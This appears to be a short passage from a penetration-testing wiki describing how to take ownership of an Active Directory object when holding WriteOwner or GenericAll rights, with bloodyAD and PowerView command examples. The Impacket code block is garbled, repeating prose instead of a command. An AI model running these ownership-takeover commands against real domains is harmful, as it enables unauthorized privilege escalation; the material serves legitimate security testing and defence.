This abuse can be carried out when controlling an object that has `WriteOwner or GenericAll` over any object.

=== "UNIX-like"
    From UNIX-like systems, this can be done with Impacket's owneredit.py (Python).
    ```bash
    From UNIX-like systems, this can be done with Impacket's owneredit.py (Python).
    ```
    Or it can be done with bloodyAD
    ```bash
    bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner $TargetObject $ControlledPrincipal
    ```
=== "Windows"
    From Windows systems, this can be achieved with Set-DomainObjectOwner (PowerView module).
    ```bash
    Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
    ```